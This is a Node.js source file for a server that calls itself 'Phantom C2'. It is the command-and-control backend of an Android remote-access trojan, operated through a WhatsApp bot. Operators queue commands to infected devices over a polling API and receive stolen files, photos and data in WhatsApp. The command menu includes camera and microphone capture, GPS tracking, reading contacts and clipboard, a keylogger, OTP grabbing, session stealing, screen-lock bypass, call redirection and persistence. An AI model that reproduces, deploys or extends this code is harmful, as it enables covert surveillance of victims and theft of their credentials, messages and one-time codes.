import { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import { Boom } from '@hapi/boom';
import qrcode from 'qrcode';
import express from 'express';
import multer from 'multer';
import initSqlJs from 'sql.js';
import dotenv from 'dotenv';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import os from 'os';

dotenv.config();

const PORT = parseInt(process.env.PORT || '3000');
const logBuffer = [];
const origLog = console.log;
const origError = console.error;
console.log = (...args) => { logBuffer.push(args.join(' ')); if (logBuffer.length > 200) logBuffer.shift(); origLog(...args); };
console.error = (...args) => { logBuffer.push('[ERR] ' + args.join(' ')); if (logBuffer.length > 200) logBuffer.shift(); origError(...args); };
const OWNER_JID = process.env.OWNER_JID || null;
const GROUP_MODE = process.env.GROUP_MODE === 'true';
const AUTH_DIR = process.env.AUTH_DIR || './auth_info';
const DB_PATH = process.env.DB_PATH || './data.db';
const TARGET_DB_PATH = process.env.TARGET_DB_PATH || './targets.json';

fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
fs.mkdirSync(AUTH_DIR, { recursive: true });

// ── Auth persistence: restore from env var backup ─────
if (process.env.AUTH_INFO_BASE64 && fs.readdirSync(AUTH_DIR).length === 0) {
  console.log('[+] Restoring auth_info from AUTH_INFO_BASE64 env var...');
  try {
    const buf = Buffer.from(process.env.AUTH_INFO_BASE64, 'base64');
    const tmp = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
    fs.writeFileSync(tmp, buf);
    const { execSync } = await import('child_process');
    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar xzf "${tmp}" 2>/dev/null`, { stdio: 'ignore' });
    fs.unlinkSync(tmp);
    console.log('[+] Auth info restored successfully');
  } catch (e) {
    console.error('[!] Auth restore failed:', e.message);
  }
}

// ── Auth backup function ──────────────────────────────
async function backupAuthToBase64() {
  try {
    const { execSync } = await import('child_process');
    const tmp = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar czf "${tmp}" "${path.basename(AUTH_DIR)}" 2>/dev/null`, { stdio: 'ignore' });
    const buf = fs.readFileSync(tmp);
    fs.unlinkSync(tmp);
    return buf.toString('base64');
  } catch (e) {
    return `Error: ${e.message}`;
  }
}

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

const SQL = await initSqlJs();
let db;
if (fs.existsSync(DB_PATH)) {
  const buf = fs.readFileSync(DB_PATH);
  db = new SQL.Database(buf);
} else {
  db = new SQL.Database();
}

db.run(`CREATE TABLE IF NOT EXISTS devices (
  device_id TEXT PRIMARY KEY,
  last_seen INTEGER NOT NULL,
  is_online INTEGER NOT NULL DEFAULT 0
)`);
db.run(`CREATE TABLE IF NOT EXISTS command_queue (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  action TEXT NOT NULL,
  payload TEXT,
  created_at INTEGER NOT NULL,
  delivered INTEGER NOT NULL DEFAULT 0,
  acked INTEGER NOT NULL DEFAULT 0
)`);

function saveDb() { fs.writeFileSync(DB_PATH, Buffer.from(db.export())); }

let targetMap = {};
if (fs.existsSync(TARGET_DB_PATH)) {
  try { targetMap = JSON.parse(fs.readFileSync(TARGET_DB_PATH, 'utf8')); } catch {}
}
function saveTargets() { fs.writeFileSync(TARGET_DB_PATH, JSON.stringify(targetMap, null, 2)); }

function queueCommand(deviceId, action, payload) {
  const now = Math.floor(Date.now() / 1000);
  db.run('INSERT INTO command_queue (device_id, action, payload, created_at) VALUES (?, ?, ?, ?)', [deviceId, action, payload || null, now]);
  saveDb();
  const result = db.exec('SELECT last_insert_rowid()');
  return result[0]?.values[0]?.[0];
}

function getPendingCommands(deviceId, afterId) {
  let stmt;
  if (afterId) {
    stmt = db.prepare('SELECT CAST(id AS TEXT) as id, action, payload FROM command_queue WHERE device_id = ? AND id > ? AND delivered = 0 ORDER BY id ASC');
    stmt.bind([deviceId, afterId]);
  } else {
    stmt = db.prepare('SELECT CAST(id AS TEXT) as id, action, payload FROM command_queue WHERE device_id = ? AND delivered = 0 ORDER BY id ASC');
    stmt.bind([deviceId]);
  }
  const rows = [];
  while (stmt.step()) rows.push(stmt.getAsObject());
  stmt.free();
  return rows;
}

function ackCommand(id) { db.run('UPDATE command_queue SET delivered = 1, acked = 1 WHERE id = ?', [parseInt(id)]); }

function upsertDevice(deviceId) {
  const now = Math.floor(Date.now() / 1000);
  db.run('INSERT INTO devices (device_id, last_seen, is_online) VALUES (?, ?, 1) ON CONFLICT(device_id) DO UPDATE SET last_seen = ?, is_online = 1', [deviceId, now, now]);
}

function getDevices() {
  const stmt = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC');
  const rows = [];
  while (stmt.step()) rows.push(stmt.getAsObject());
  stmt.free();
  return rows;
}

function formatEmbed(embed) {
  if (!embed) return '';
  let text = '';
  if (embed.title) text += `*${embed.title}*\n`;
  if (embed.description) text += `${embed.description}\n`;
  if (embed.fields) {
    for (const f of embed.fields) {
      text += `▸ *${f.name}*: ${f.value}\n`;
    }
  }
  if (embed.color && !isNaN(embed.color)) {
    text += `\n[#${embed.color.toString(16).padStart(6, '0')}]`;
  }
  return text.trim();
}

// ── Plugin System ──────────────────────────────────────────
const plugins = [];
const commandMap = {};

async function loadPlugins() {
  const pluginDir = './plugins';
  if (!fs.existsSync(pluginDir)) fs.mkdirSync(pluginDir);
  const files = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js') && f !== '_loader.js');
  for (const file of files) {
    try {
      const mod = await import(`./plugins/${file}`);
      const plugin = mod.default;
      if (!plugin?.name || !plugin?.handler) continue;
      plugin._file = file;
      plugins.push(plugin);
      for (const cmd of (plugin.commands || [])) {
        commandMap[cmd.toLowerCase()] = plugin;
      }
      console.log(`[+] Plugin loaded: ${plugin.name} (${(plugin.commands || []).join(', ')})`);
    } catch (e) {
      console.error(`[!] Plugin ${file} load error:`, e.message);
    }
  }
}

await loadPlugins();

// ── Shared Context ─────────────────────────────────────────
function createCtx(sock, jid, cmd, args, text) {
  return {
    sock, jid, cmd, args, text,
    getDevices,
    queueCommand,
    getTarget: (jid) => targetMap[jid],
    setTarget: (jid, device) => { targetMap[jid] = device; saveTargets(); },
    clearTarget: (jid) => { delete targetMap[jid]; saveTargets(); },
    alertJid: () => alertJid,
    db,
    isGroup: jid.endsWith('@g.us'),
  };
}

function findCommand(cmd) {
  return commandMap[cmd.toLowerCase()] || null;
}

// ── Forward to Device ──────────────────────────────────────
async function forwardToDevice(ctx) {
  const { sock, jid, cmd, args } = ctx;
  const target = targetMap[jid];
  if (target) {
    const id = queueCommand(target, cmd, args);
    await sock.sendMessage(jid, { text: `📤 Queued \`${cmd}\` → \`${target}\` (#${id})` });
  } else {
    const devices = getDevices();
    if (!devices.length) {
      await sock.sendMessage(jid, { text: '❌ *No devices registered.*\nUse `!menu` to see available commands.' });
      return;
    }
    for (const d of devices) queueCommand(d.device_id, cmd, args);
    await sock.sendMessage(jid, { text: `📤 Broadcast \`${cmd}\` to ${devices.length} devices` });
  }
}

// ── WhatsApp Bot ───────────────────────────────────────────
let sock = null;
let alertJid = null;
let qrPng = null;

async function startBot() {
  // Reset auth if FRESH=true (MUST be before useMultiFileAuthState)
  if (process.env.FRESH === 'true' || process.env.FRESH === '1') {
    try { fs.rmSync(AUTH_DIR, { recursive: true, force: true }); console.log('[+] Auth wiped for fresh pairing'); } catch {}
  }

  const { version } = await fetchLatestBaileysVersion();
  console.log(`[+] Baileys v${version.join('.')}`);

  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    version,
    logger: pino({ level: 'warn' }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
  });

  let pairingRequested = false;
  let everRegistered = !!(state.creds?.registered || state.creds?.me?.id);
  const getPhoneForPairing = () => {
    const raw = process.env.PHONE_NUMBER?.replace(/[^0-9]/g, '');
    if (raw && raw.length < 7) {
      console.log(`[!] PHONE_NUMBER "${process.env.PHONE_NUMBER}" -> "${raw}" too short. Include country code.`);
      console.log(`    Example for Morocco: 2126XXXXXXXX`);
    }
    return raw;
  };

  async function requestPairing(phone) {
    if (pairingRequested || state.creds?.registered) return;
    pairingRequested = true;
    try {
      const customCode = process.env.PAIRING_CODE || undefined;
      const code = await sock.requestPairingCode(phone, customCode);
      const hyphenated = code.length === 8 ? `${code.slice(0,4)}-${code.slice(4)}` : code;
      console.log(`\n═══════════════════════════════════════════════════
  PHONE NUMBER: ${phone}
  PAIRING CODE: ${code}
  With hyphen:  ${hyphenated}
  ───────────────────────────────────────────────
  1. Open WhatsApp Desktop
  2. Settings → Linked Devices → Link a Device
  3. Enter the code ABOVE (letters are UPPERCASE)
  4. Code expires in ~2 minutes
  ───────────────────────────────────────────────
  If it fails, check:
  - PHONE_NUMBER has COUNTRY CODE (e.g. 212 for Morocco)
  - No +, spaces, or dashes in PHONE_NUMBER
  - Set FRESH=true env var to wipe old auth
  - Set PAIRING_CODE=ABCD1234 for a fixed 8-char code
═══════════════════════════════════════════════════\n`);
    } catch (e) {
      console.log('[!] Pairing code failed:', e.message);
      console.log('    Check PHONE_NUMBER format. Digits only, with country code.');
      console.log('    Example: 2126XXXXXXXX for Morocco (+212 6XX XXXXXX)');
      pairingRequested = false; // Allow retry
    }
  }

  // Fallback: request pairing 2s after socket creation even if open event doesn't fire
  if (!everRegistered) {
    const phone = getPhoneForPairing();
    if (phone) setTimeout(() => requestPairing(phone), 2000);
  }

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (qr && !state.creds?.registered) {
      try {
        // Show small ASCII QR in logs
        const qrOpts = { errorCorrectionLevel: 'L' };
        const qrSmall = await qrcode.toString(qr, { ...qrOpts, type: 'terminal', small: true });
        console.log(`\n══ QR CODE — Scan with WhatsApp phone ══\n${qrSmall}\n═══════════════════════════════════════\n`);
        // Also generate PNG for /qr.png endpoint
        qrPng = await qrcode.toBuffer(qr, { ...qrOpts, type: 'png', width: 256, margin: 2 });
      } catch (e) {
        console.log('[!] QR error:', e.message);
      }
    }
    if (connection === 'open') {
      console.log(`[+] Connected as ${sock.user?.id}`);
      everRegistered = true;
      const targetJid = alertJid || (process.env.PHONE_NUMBER ? `${process.env.PHONE_NUMBER.replace(/\D/g, '')}@s.whatsapp.net` : null);
      if (targetJid) {
        try { await sock.sendMessage(targetJid, { text: '✅ *Phantom C2 bot online*\nSend `!menu` to start.' }); } catch (e) { console.error('[!] online alert failed:', e.message); }
      }
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error ? new Boom(lastDisconnect.error).output.statusCode : 500;
      const shouldReconnect = code !== DisconnectReason.loggedOut;
      const delay = everRegistered && (code === 503 || code === 502) ? 5000 : 1000;
      console.log(`[!] Disconnected (${code}). Reconnect: ${shouldReconnect} delay: ${delay}ms`);
      if (shouldReconnect) setTimeout(startBot, delay);
    }
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    try {
    console.log(`[debug] messages.upsert type=${type} count=${messages.length}`);
    for (const msg of messages) {
      const jid = msg.key.remoteJid;
      const msgText = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
      const fromMe = msg.key?.fromMe;
      if (msgText) console.log(`[debug] msg fromMe=${fromMe} jid=${jid} text="${msgText.slice(0,60)}"`);
      else if (msg.message?.listResponseMessage) console.log(`[debug] list response fromMe=${fromMe} jid=${jid} rowId=${msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId}`);
      const isGroup = jid.endsWith('@g.us');

      if (OWNER_JID && jid !== OWNER_JID && !(GROUP_MODE && isGroup)) continue;

      if (!alertJid) {
        alertJid = jid;
        console.log(`[+] Alert JID set to ${jid}`);
      }

      // ── Interactive List Response ─────────────────────
      const listId = msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId;
      if (listId) {
        const parts = listId.split('_');
        const cmd = parts[0] === 'cmd' ? parts.slice(1).join('_') : listId;
        const ctx = createCtx(sock, jid, cmd, '', listId);

        // Map menu buttons to proper device commands
        const cmdMap = {
          'screenshot': ['screenshot', ''],
          'gps': ['location', ''],
          'camera': ['camera', ''],
          'mic': ['mic', ''],
          'shell': null, 'python': null, 'notification': null, 'files': null, 'download': null, 'upload': null,
          'clipboard': ['clipboard', ''],
          'ip': ['ip', ''],
          'sysinfo': ['sysinfo', ''],
          'installed': ['installed', ''],
          'contacts': ['contacts', ''],
          'wifi': ['wifi', ''],
          'images': ['dir', '/sdcard/DCIM'],
          'sdp_bypass': ['exploit', 'run sdp_bypass'],
          'otp_grabber': ['exploit', 'run otp_grabber'],
          'wifi_extractor': ['exploit', 'run wifi_extractor'],
          'session_stealer': ['exploit', 'run session_stealer'],
          'keylogger': ['exploit', 'run keylogger'],
          'adb_wifi': ['exploit', 'run adb_wifi'],
          'persist_system': ['exploit', 'run persist_system'],
          'call_redirect': ['exploit', 'run call_redirect'],
          'mock_sms': ['exploit', 'run mock_sms'],
          'screen_lock_bypass': ['exploit', 'run screen_lock_bypass'],
          'private_space_peek': ['exploit', 'run private_space_peek'],
          'notification_cooldown_bypass': ['exploit', 'run notification_cooldown_bypass'],
          'exploit_list': ['exploit', 'list'],
          'auto_pwn': ['auto_pwn', ''],
          'encrypt_help': ['encrypt_help', ''],
          'd_help': ['d_help', ''],
        };

        const mapped = cmdMap[cmd];
        if (mapped === null) {
          await sock.sendMessage(jid, { text: `ℹ️ *${cmd}* requires a parameter.\nUsage: \`!${cmd} <value>\`` });
        } else if (mapped) {
          await forwardToDevice({ ...ctx, cmd: mapped[0], args: mapped[1] });
        } else {
          const plugin = findCommand(cmd);
          if (plugin) {
            await plugin.handler(ctx);
          } else if (cmd === 'saveauth') {
            const b64 = await backupAuthToBase64();
            await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
          } else {
            await forwardToDevice(ctx);
          }
        }
        continue;
      }

      // ── Text Commands ─────────────────────────────────
      const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
      if (!text || !text.startsWith('!')) continue;

      const parts = text.slice(1).trim().split(/\s+/);
      const cmd = parts[0].toLowerCase();
      const args = parts.slice(1).join(' ');

      const ctx = createCtx(sock, jid, cmd, args, text);

      const plugin = findCommand(cmd);
      if (plugin) {
        await plugin.handler(ctx);
      } else if (cmd === 'saveauth') {
        const b64 = await backupAuthToBase64();
        await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
      } else if (cmd === 'd') {
        if (!args) {
          await sock.sendMessage(jid, { text: '📖 *!d <base64>*\nDecrypt an encrypted C2 response inline.\nPaste the base64 (after 🔒).' });
        } else {
          try {
            const mod = await import('./lib/crypto.js');
            const result = mod.decrypt(args.trim());
            await sock.sendMessage(jid, { text: `🔓 *Decrypted:*\n${result}` });
          } catch (e) {
            await sock.sendMessage(jid, { text: `❌ Decrypt error: ${e.message}\nMake sure you only paste the base64 (after 🔒).` });
          }
        }
      } else {
        await forwardToDevice(ctx);
      }
    }
    } catch (e) {
      console.error('[!] message handler error:', e.message, e.stack?.slice(0, 300));
    }
  });
}

// ── Express API ────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '50mb' }));

const API_KEY = process.env.API_KEY || null;
function requireApiKey(req, res, next) {
  if (!API_KEY) return next();
  const auth = req.headers['authorization'];
  if (!auth || !auth.startsWith('Bearer ') || auth.slice(7) !== API_KEY) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

app.get('/health', (req, res) => {
  res.json({ status: sock?.user ? 'ok' : 'connecting', bot: sock?.user?.id || null, uptime: Math.floor(process.uptime()), plugins: plugins.length });
});

app.get('/logs', (req, res) => {
  res.set('Content-Type', 'text/plain');
  res.send(logBuffer.join('\n'));
});

app.get('/qr.png', (req, res) => {
  if (!qrPng) return res.status(404).send('No QR yet');
  res.set('Content-Type', 'image/png');
  res.send(qrPng);
});

app.get('/api/poll', requireApiKey, (req, res) => {
  const deviceId = req.query.device;
  const after = req.query.after ? parseInt(req.query.after) : null;
  if (!deviceId) return res.status(400).json({ error: 'device required' });
  upsertDevice(deviceId);
  saveDb();
  res.json(getPendingCommands(deviceId, after));
});

app.post('/api/ack', requireApiKey, (req, res) => {
  const id = req.body?.id;
  if (!id) return res.status(400).json({ error: 'id required' });
  ackCommand(id);
  saveDb();
  res.json({ ok: true });
});

app.post('/api/send', requireApiKey, upload.single('file'), async (req, res) => {
  if (!alertJid || !sock?.user) return res.status(503).json({ error: 'bot not ready' });
  try {
    const deviceId = req.body?.device || 'unknown';
    const type = req.body?.type || 'text';
    const content = req.body?.content || '';
    const caption = req.body?.caption || '';
    upsertDevice(deviceId);
    saveDb();
    if (type === 'file' && req.file) {
      const isMedia = req.file.mimetype?.startsWith('image/') || req.file.mimetype?.startsWith('video/');
      const cap = `📁 *${deviceId}*: ${caption || content}`;
      if (isMedia) {
        await sock.sendMessage(alertJid, { image: req.file.buffer, caption: cap, mimetype: req.file.mimetype });
      } else {
        await sock.sendMessage(alertJid, { document: req.file.buffer, fileName: req.file.originalname || 'file', caption: cap, mimetype: req.file.mimetype });
      }
    } else if (type === 'embed' && req.body.embed) {
      const embed = typeof req.body.embed === 'string' ? JSON.parse(req.body.embed) : req.body.embed;
      await sock.sendMessage(alertJid, { text: `📦 *${deviceId}*\n${content ? content + '\n' : ''}${formatEmbed(embed)}` });
    } else if (type === 'edit' || type === 'edit_embed') {
      await sock.sendMessage(alertJid, { text: `✏️ *${deviceId}* edited ${req.body.messageId || ''}\n${content}` });
    } else {
      await sock.sendMessage(alertJid, { text: `💬 *${deviceId}*\n${content}` });
    }
    res.json({ ok: true });
  } catch (e) {
    console.error('[!] /api/send error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/delete', requireApiKey, (req, res) => {
  if (!alertJid || !sock?.user) return res.status(503).json({ error: 'bot not ready' });
  const deviceId = req.body?.device || 'unknown';
  upsertDevice(deviceId);
  saveDb();
  sock.sendMessage(alertJid, { text: `🗑️ *${deviceId}* deleted: ${req.body?.messageId || ''}` });
  res.json({ ok: true });
});

app.get('/api/saveauth', async (req, res) => {
  if (!sock?.user) return res.status(503).json({ error: 'bot not connected' });
  const b64 = await backupAuthToBase64();
  res.json({ status: 'ok', bot: sock.user?.id, auth_base64: b64 });
});

app.listen(PORT, () => {
  console.log(`[+] API on :${PORT}`);
  console.log(`[+] Plugins: ${plugins.map(p => p.name).join(', ')}`);
});

startBot().catch(e => { console.error('[!] Fatal:', e); process.exit(1); });

process.on('SIGINT', () => { saveDb(); process.exit(0); });
process.on('SIGTERM', () => { saveDb(); process.exit(0); });

process.on('uncaughtException', (err) => { console.error('[!] uncaught:', err.message, err.stack?.slice(0, 300)); });
process.on('unhandledRejection', (err) => { console.error('[!] unhandled rejection:', err.message, err.stack?.slice(0, 300)); });
